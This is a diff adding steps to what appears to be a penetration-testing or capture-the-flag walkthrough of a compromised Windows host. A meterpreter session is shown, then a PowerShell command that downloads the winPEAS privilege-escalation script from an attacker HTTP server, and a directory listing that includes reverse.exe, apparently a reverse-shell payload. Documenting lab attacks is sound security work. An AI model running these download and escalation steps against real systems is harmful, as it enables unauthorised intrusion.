@@ -351,3 +351,34 @@ meterpreter > cat 20198415519.INI_LOG.txt
 08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)  [...]
 ```
 ```
+c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://192.168.170.150:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+```
+```
+c:\Windows\Temp>
+dir
+c:\Windows\Temp>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Directory of c:\Windows\Temp
+07/17/2026  09:11 PM    <DIR>          .
+07/17/2026  09:11 PM    <DIR>          ..
+08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
+08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
+08/06/2019  02:13 PM             1,206 cleanup.txt
+08/06/2019  02:13 PM               421 cmdout
+08/06/2019  02:11 PM                 0 DMI2EBC.tmp
+08/03/2019  10:43 AM                 0 DMI4D21.tmp
+08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
+08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
+07/17/2026  08:18 PM    <DIR>          EC2Launch126647355
+07/17/2026  08:22 PM    <DIR>          Microsoft
+07/17/2026  08:22 PM            73,802 reverse.exe
+08/06/2019  02:13 PM                21 stage1-complete.txt
+08/06/2019  02:13 PM            28,495 stage1.txt
+05/12/2019  09:03 PM           113,328 svcexec.exe
+08/06/2019  02:13 PM                67 tmp.dat
+07/17/2026  09:11 PM            38,904 winPEAS.bat
+              14 File(s)        747,688 bytes
+               4 Dir(s)  38,983,524,352 bytes free
+```
+
